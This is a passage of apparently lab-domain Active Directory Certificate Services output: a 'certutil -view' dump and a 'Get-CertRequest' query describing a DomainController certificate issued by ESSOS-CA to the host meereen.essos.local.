    1.3.6.1.5.5.7.1.1: Flags = 0, Length = ad
    Authority Information Access
        [1]Authority Info Access
             Access Method=Certification Authority Issuer (1.3.6.1.5.5.7.48.2)
             Alternative Name:
                  URL=ldap:///CN=ESSOS-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority (ldap:///CN=ESSOS-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority)

    1.3.6.1.4.1.311.20.2: Flags = 0, Length = 22
    Certificate Template Name (Certificate Type)
        DomainController

    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

    2.5.29.37: Flags = 0, Length = 16
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)
        Server Authentication (1.3.6.1.5.5.7.3.1)

    2.5.29.17: Flags = 0, Length = 38
    Subject Alternative Name
        Other Name:
             DS Object Guid=04 10 59 6c d1 59 fe 7f 2e 42 be 90 60 fa ad 4a 61 94
        DNS Name=meereen.essos.local

    1.3.6.1.4.1.311.25.2: Flags = 0, Length = 41

    0000  30 3f a0 3d 06 0a 2b 06  01 04 01 82 37 19 02 01   0?.=..+.....7...
    0010  a0 2f 04 2d 53 2d 31 2d  35 2d 32 31 2d 36 36 36   ./.-S-1-5-21-666
    0020  31 39 39 36 38 32 2d 31  34 31 31 33 34 32 31 34   199682-141134214
    0030  37 2d 32 39 33 38 37 31  37 38 35 35 2d 31 30 30   7-2938717855-100
    0040  31                                                 1
0000: 30 3f                                     ; SEQUENCE (3f Bytes)
0002:    a0 3d                                  ; OPTIONAL[0] (3d Bytes)
0004:       06 0a                               ; OBJECT_ID (a Bytes)
0006:       |  2b 06 01 04 01 82 37 19  02 01
            |     ; 1.3.6.1.4.1.311.25.2.1
0010:       a0 2f                               ; OPTIONAL[0] (2f Bytes)
0012:          04 2d                            ; OCTET_STRING (2d Bytes)
0014:             53 2d 31 2d 35 2d 32 31  2d 36 36 36 31 39 39 36  ; S-1-5-21-6661996
0024:             38 32 2d 31 34 31 31 33  34 32 31 34 37 2d 32 39  ; 82-1411342147-29
0034:             33 38 37 31 37 38 35 35  2d 31 30 30 31           ; 38717855-1001

    1.2.840.113549.1.9.15: Flags = 0, Length = 37
    SMIME Capabilities
        [1]SMIME Capability
             Object ID=1.2.840.113549.3.2
             Parameters=02 02 00 80
        [2]SMIME Capability
             Object ID=1.2.840.113549.3.4
             Parameters=02 02 00 80
        [3]SMIME Capability
             Object ID=1.3.14.3.2.7
        [4]SMIME Capability
             Object ID=1.2.840.113549.3.7

Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  83 0c 71 52 ca 58 92 91  80 56 8b 4a b9 6c d4 0d
    0010  52 59 43 24 4b 26 19 ac  10 a3 ae 0c 52 73 24 cb
    0020  f3 4f 16 08 b9 0f af bd  54 ad 38 7e 59 88 b9 16
    0030  66 6e d8 b0 f0 9f bd fd  9a e5 4a 32 29 31 c1 29
    0040  99 73 f7 f6 f1 5f d2 7d  60 11 e4 c3 b8 5c ce ef
    0050  d3 d8 83 ee 9f 3f dc c1  66 dc 94 10 86 b2 dc 4d
    0060  fe 9c b0 38 09 d8 81 1d  3f 39 0b f5 a1 e1 eb 38
    0070  1c c9 75 56 1a 81 f6 ea  a3 1c 08 4c de 95 b9 0c
    0080  e0 42 58 81 15 db 6f 71  8b 3f bc c9 42 96 03 bf
    0090  ca 64 7c 89 74 e4 eb 7a  73 d0 23 7c b4 d8 d1 fe
    00a0  ec 7d 7a 7e 6e ef 7c f7  97 f0 62 59 1c 6a e1 1e
    00b0  78 9f 14 0d 0a 9b ea a0  99 ec 22 9d 0b 07 dd f1
    00c0  5f 08 21 4d e5 9b 3d 6f  44 97 01 79 f5 1f fd 15
    00d0  83 99 ca 79 88 d9 e1 99  0c b5 c2 09 78 c8 5d f1
    00e0  1a b9 75 cb 38 79 3b 93  a0 d3 57 cd 32 57 be e1
    00f0  ce 4b d2 72 db 85 95 c2  55 4f 97 ce e7 52 70 11
Non-root Certificate
Key Id Hash(rfc-sha1): b2d5e7ef4672bcb5dab7a57cbb83581ca163360c
Key Id Hash(sha1): bb834062b1105ab284311678eb5c4d0df15b5b0a
Key Id Hash(bcrypt-sha1): 2236feb913ac946636698e31a5e71d0dd2bbe36f
Key Id Hash(bcrypt-sha256): 6b6f48ffbe67a0bc4b245fd98a17fbfd663c624cc721dc727267a27806227eb5
Key Id Hash(md5): 48a8173a592583c23b102a3e40e534bf
Key Id Hash(sha256): 51964b0364811f0b677955b85b9c48f1f18ecf3c074d3c0a34eeec3b23f76bd6
Key Id Hash(pin-sha256): IBF1dXgDZcFG5idJ49s5PzIQT3Sqv3OYe4uwlRpJJu8=
Key Id Hash(pin-sha256-hex): 20117575780365c146e62749e3db393f32104f74aabf73987b8bb0951a4926ef
Cert Hash(md5): 2a6825448b9a158eab3f38391b19f9cd
Cert Hash(sha1): 45a0221d9526c06d5652b7303e52cade4a4350e5
Cert Hash(sha256): 5d93b93d0c5ac1c48f7140dfc2ec3092b1069ea8d5bd9258df72e3d8605230c5
Signature Hash: edac895f8d134002f8d345dec1a526a6e15f75535a399313e9054ae1ca7c480b

  Certificate Hash: "45 a0 22 1d 95 26 c0 6d 56 52 b7 30 3e 52 ca de 4a 43 50 e5"
0000    34 00 35 00 20 00 61 00  30 00 20 00 32 00 32 00   4.5. .a.0. .2.2.
0010    20 00 31 00 64 00 20 00  39 00 35 00 20 00 32 00    .1.d. .9.5. .2.
0020    36 00 20 00 63 00 30 00  20 00 36 00 64 00 20 00   6. .c.0. .6.d. .
0030    35 00 36 00 20 00 35 00  32 00 20 00 62 00 37 00   5.6. .5.2. .b.7.
0040    20 00 33 00 30 00 20 00  33 00 65 00 20 00 35 00    .3.0. .3.e. .5.
0050    32 00 20 00 63 00 61 00  20 00 64 00 65 00 20 00   2. .c.a. .d.e. .
0060    34 00 61 00 20 00 34 00  33 00 20 00 35 00 30 00   4.a. .4.3. .5.0.
0070    20 00 65 00 35 00                                   .e.5.

  Certificate Template: "DomainController"
0000    44 00 6f 00 6d 00 61 00  69 00 6e 00 43 00 6f 00   D.o.m.a.i.n.C.o.
0010    6e 00 74 00 72 00 6f 00  6c 00 6c 00 65 00 72 00   n.t.r.o.l.l.e.r.

  Template Enrollment Flags: 0x29 (41)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
      (CT_FLAG_PEND_ALL_REQUESTS -- 2)
      (CT_FLAG_PUBLISH_TO_KRA_CONTAINER -- 4)
    CT_FLAG_PUBLISH_TO_DS -- 8
      (CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16))
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
      (CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT -- 40 (64))
      (CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED -- 80 (128))
      (CT_FLAG_USER_INTERACTION_REQUIRED -- 100 (256))
      (CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512))
      (CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE -- 400 (1024))
      (CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF -- 800 (2048))
      (CT_FLAG_ADD_OCSP_NOCHECK -- 1000 (4096))
      (CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL -- 2000 (8192))
      (CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS -- 4000 (16384))
      (CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS -- 8000 (32768))
      (CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT -- 10000 (65536))
      (CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST -- 20000 (131072))
      (CT_FLAG_SKIP_AUTO_RENEWAL -- 40000 (262144))
  Template General Flags: 0x1026c (66156)
      (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1)
      (CT_FLAG_ADD_EMAIL -- 2)
    CT_FLAG_ADD_OBJ_GUID -- 4
    CT_FLAG_PUBLISH_TO_DS -- 8
      (CT_FLAG_EXPORTABLE_KEY -- 10 (16))
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_MACHINE_TYPE -- 40 (64)
      (CT_FLAG_IS_CA -- 80 (128))
      (CT_FLAG_ADD_DIRECTORY_PATH -- 100 (256))
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
      (CT_FLAG_ADD_SUBJECT_DIRECTORY_PATH -- 400 (1024))
      (CT_FLAG_IS_CROSS_CA -- 800 (2048))
      (CT_FLAG_DONOTPERSISTINDB -- 1000 (4096))
    CT_FLAG_IS_DEFAULT -- 10000 (65536)
      (CT_FLAG_IS_MODIFIED -- 20000 (131072))
      (CT_FLAG_IS_DELETED -- 40000 (262144))
      (CT_FLAG_POLICY_MISMATCH -- 80000 (524288))
  Template Private Key Flags: 0x0
      (CTPRIVATEKEY_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL -- 1)
      (CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16))
      (CTPRIVATEKEY_FLAG_STRONG_KEY_PROTECTION_REQUIRED -- 20 (32))
      (CTPRIVATEKEY_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM -- 40 (64))
      (CTPRIVATEKEY_FLAG_REQUIRE_SAME_KEY_RENEWAL -- 80 (128))
      (CTPRIVATEKEY_FLAG_USE_LEGACY_PROVIDER -- 100 (256))
      (CTPRIVATEKEY_FLAG_EK_TRUST_ON_USE -- 200 (512))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_CERT -- 400 (1024))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_KEY -- 800 (2048))
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
      (CTPRIVATEKEY_FLAG_ATTEST_PREFERRED -- 1000 (4096))
      (CTPRIVATEKEY_FLAG_ATTEST_REQUIRED -- 2000 (8192))
      (CTPRIVATEKEY_FLAG_ATTEST_WITHOUT_POLICY -- 4000 (16384))
    TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0
      (TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536))
      (TEMPLATE_SERVER_VER_2008<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 20000 (131072))
      (TEMPLATE_SERVER_VER_2008R2<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 30000 (196608))
      (TEMPLATE_SERVER_VER_WIN8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 40000 (262144))
      (TEMPLATE_SERVER_VER_WINBLUE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 50000 (327680))
      (TEMPLATE_SERVER_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 60000 (393216))
      (V7<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 70000 (458752))
      (V8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 80000 (524288))
      (V9<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 90000 (589824))
      (V10<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- a0000 (655360))
      (V11<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- b0000 (720896))
      (V12<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- c0000 (786432))
      (V13<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- d0000 (851968))
      (V14<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- e0000 (917504))
      (V15<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- f0000 (983040))
      (CTPRIVATEKEY_FLAG_HELLO_KSP_KEY -- 100000 (1048576))
      (CTPRIVATEKEY_FLAG_HELLO_LOGON_KEY -- 200000 (2097152))
    TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0
      (TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216))
      (TEMPLATE_CLIENT_VER_VISTA<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 2000000 (33554432))
      (TEMPLATE_CLIENT_VER_WIN7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 3000000 (50331648))
      (TEMPLATE_CLIENT_VER_WIN8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 4000000 (67108864))
      (TEMPLATE_CLIENT_VER_WINBLUE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 5000000 (83886080))
      (TEMPLATE_CLIENT_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 6000000 (100663296))
      (V7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 7000000 (117440512))
      (V8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 8000000 (134217728))
      (V9<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 9000000 (150994944))
      (V10<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- a000000 (167772160))
      (V11<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- b000000 (184549376))
      (V12<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- c000000 (201326592))
      (V13<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- d000000 (218103808))
      (V14<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- e000000 (234881024))
      (V15<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- f000000 (251658240))
  Serial Number: "200000002123705e657e1e26d7000000000021"
0000    32 00 30 00 30 00 30 00  30 00 30 00 30 00 30 00   2.0.0.0.0.0.0.0.
0010    32 00 31 00 32 00 33 00  37 00 30 00 35 00 65 00   2.1.2.3.7.0.5.e.
0020    36 00 35 00 37 00 65 00  31 00 65 00 32 00 36 00   6.5.7.e.1.e.2.6.
0030    64 00 37 00 30 00 30 00  30 00 30 00 30 00 30 00   d.7.0.0.0.0.0.0.
0040    30 00 30 00 30 00 30 00  32 00 31 00               0.0.0.0.2.1.

  Issuer Name ID: 0x0 CA Version 0.0
  Certificate Effective Date: 7/30/2025 7:14 PM GMT
  Certificate Expiration Date: 7/30/2026 7:14 PM GMT
  Issued Subject Key Identifier: "b2 d5 e7 ef 46 72 bc b5 da b7 a5 7c bb 83 58 1c a1 63 36 0c"
0000    62 00 32 00 20 00 64 00  35 00 20 00 65 00 37 00   b.2. .d.5. .e.7.
0010    20 00 65 00 66 00 20 00  34 00 36 00 20 00 37 00    .e.f. .4.6. .7.
0020    32 00 20 00 62 00 63 00  20 00 62 00 35 00 20 00   2. .b.c. .b.5. .
0030    64 00 61 00 20 00 62 00  37 00 20 00 61 00 35 00   d.a. .b.7. .a.5.
0040    20 00 37 00 63 00 20 00  62 00 62 00 20 00 38 00    .7.c. .b.b. .8.
0050    33 00 20 00 35 00 38 00  20 00 31 00 63 00 20 00   3. .5.8. .1.c. .
0060    61 00 31 00 20 00 36 00  33 00 20 00 33 00 36 00   a.1. .6.3. .3.6.
0070    20 00 30 00 63 00                                   .0.c.

  Binary Public Key:
0000    30 82 01 0a 02 82 01 01  00 94 75 ad ab 8d 9a 44
0010    ea 57 33 0e 64 b3 a9 84  65 26 36 b8 3d 5c 7a c7
0020    1a 42 01 84 bc a4 5b 9c  60 ab 48 97 cd cd 4c 61
0030    54 6d 6b ba 63 79 cf 6c  15 c4 e4 c7 01 a0 f6 db
0040    31 bd bd f7 0e 9c 86 d6  0c c5 c7 03 cc cd df 02
0050    c2 72 86 a0 27 f7 a9 87  73 5c e9 5d c5 7f 78 d5
0060    63 1f 8f a6 f6 b3 33 52  59 3c b3 d0 45 f2 cc 89
0070    85 c6 e2 f4 cb 2c c1 cc  a6 84 da fd cb 13 f7 7e
0080    d6 79 88 e9 ef 31 f2 93  8c 56 d9 c2 b9 7f 32 17
0090    be 83 7b c9 60 5d be 10  35 6f 77 b2 eb ad 31 b0
00a0    bd d3 97 13 3c 82 c6 96  e3 8f 59 d2 61 2c 00 da
00b0    09 df 17 90 6a 85 53 a5  6e bd 3c b5 63 69 b5 e3
00c0    6e b0 7a 2a d8 05 e7 35  3d 1e a3 59 fb dd b8 63
00d0    5f 88 e4 ec 77 c6 4c e2  ae d7 b1 93 e2 9d 57 07
00e0    8a 11 51 b4 87 f2 0a 28  9f 56 9f d6 d1 93 98 8e
00f0    10 0b ab 27 62 81 50 a4  d7 e6 fe 89 a2 8e d1 da
0100    d8 ad 25 0b 01 85 ff 2e  d3 02 03 01 00 01

  Public Key Length: 0x800 (2048)
  Public Key Algorithm: "1.2.840.113549.1.1.1" RSA (RSA_SIGN)
0000    31 00 2e 00 32 00 2e 00  38 00 34 00 30 00 2e 00   1...2...8.4.0...
0010    31 00 31 00 33 00 35 00  34 00 39 00 2e 00 31 00   1.1.3.5.4.9...1.
0020    2e 00 31 00 2e 00 31 00                            ..1...1.

  Public Key Algorithm Parameters:
0000    05 00                                              ..

  Publish Expired Certificate in CRL: 0x0
  User Principal Name: "MEEREEN$@essos.local"
0000    4d 00 45 00 45 00 52 00  45 00 45 00 4e 00 24 00   M.E.E.R.E.E.N.$.
0010    40 00 65 00 73 00 73 00  6f 00 73 00 2e 00 6c 00   @.e.s.s.o.s...l.
0020    6f 00 63 00 61 00 6c 00                            o.c.a.l.

  Issued Distinguished Name: "CN=meereen.essos.local"
0000    43 00 4e 00 3d 00 6d 00  65 00 65 00 72 00 65 00   C.N.=.m.e.e.r.e.
0010    65 00 6e 00 2e 00 65 00  73 00 73 00 6f 00 73 00   e.n...e.s.s.o.s.
0020    2e 00 6c 00 6f 00 63 00  61 00 6c 00               ..l.o.c.a.l.

  Issued Binary Name:
0000    30 1e 31 1c 30 1a 06 03  55 04 03 13 13 6d 65 65   0.1.0...U....mee
0010    72 65 65 6e 2e 65 73 73  6f 73 2e 6c 6f 63 61 6c   reen.essos.local

  Issued Country/Region: EMPTY
  Issued Organization: EMPTY
  Issued Organization Unit: EMPTY
  Issued Common Name: "meereen.essos.local"
0000    6d 00 65 00 65 00 72 00  65 00 65 00 6e 00 2e 00   m.e.e.r.e.e.n...
0010    65 00 73 00 73 00 6f 00  73 00 2e 00 6c 00 6f 00   e.s.s.o.s...l.o.
0020    63 00 61 00 6c 00                                  c.a.l.

  Issued City: EMPTY
  Issued State: EMPTY
  Issued Title: EMPTY
  Issued First Name: EMPTY
  Issued Initials: EMPTY
  Issued Last Name: EMPTY
  Issued Domain Component: EMPTY
  Issued Email Address: EMPTY
  Issued Street Address: EMPTY
  Issued Unstructured Name: EMPTY
  Issued Unstructured Address: EMPTY
  Issued Device Serial Number: EMPTY

Maximum Row Index: 1

1 Rows
  36 Row Properties, Total Size = 3216, Max Size = 1523, Ave Size = 89
   0 Request Attributes, Total Size = 0, Max Size = 0, Ave Size = 0
   0 Certificate Extensions, Total Size = 0, Max Size = 0, Ave Size = 0
  36 Total Fields, Total Size = 3216, Max Size = 1523, Ave Size = 89
CertUtil: -view command completed successfully.
```

</details>

### Get-CertRequest
```
Get-CertRequest -Filter 'RequestID -eq 33'


CA                                          : braavos.essos.local\ESSOS-CA
Request.ID                                  : 33
Request.RequesterName                       : ESSOS\MEEREEN$
Request.CommonName                          : Meereen$
Request.CallerName                          : ESSOS\MEEREEN$
Request.DistinguishedName                   : CN=Meereen$
Request.ClientInformation.MachineName       :
Request.ClientInformation.ProcessName       :
Request.ClientInformation.UserName          :
Request.SubjectAltNamesExtension            :
Request.SubjectAltNamesAttrib               :
Request.ApplicationPolicies                 :
UPN                                         : MEEREEN$@essos.local
Issued.DistinguishedName                    : CN=meereen.essos.local
Issued.CommonName                           : meereen.essos.local
CertificateTemplate                         : DomainController
EnrollmentFlags                             : {CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS, CT_FLAG_AUTO_ENROLLMENT, CT_FLAG_PUBLISH_TO_DS}
SerialNumber                                : 200000002123705e657e1e26d7000000000021
Certificate.SAN                             : Other Name:DS Object Guid=04 10 59 6c d1 59 fe 7f 2e 42 be 90 60 fa ad 4a 61 94, DNS Name=meereen.essos.local
Certificate.ApplicationPolicies             :
Certificate.IssuancePolicies.PolicyName     :
Certificate.IssuancePolicies.GroupCN        :
Certificate.IssuancePolicies.GroupSID       :
Certificate.EKU                             : Client Authentication (1.3.6.1.5.5.7.3.2), Server Authentication (1.3.6.1.5.5.7.3.1)
Certificate.SID_Extension.SID               : S-1-5-21-666199682-1411342147-2938717855-1001
Certificate.SID_Extension.DistinguishedName : CN=MEEREEN,OU=Domain Controllers,DC=essos,DC=local
Certificate.SID_Extension.SamAccountName    : MEEREEN$
Certificate.SID_Extension.UPN               :
Certificate.SID_Extension.CN                : MEEREEN
RequestDate                                 : 7/30/2025 7:24:00 PM
StartDate                                   : 7/30/2025 7:14:00 PM
EndDate                                     : 7/30/2026 7:14:00 PM
```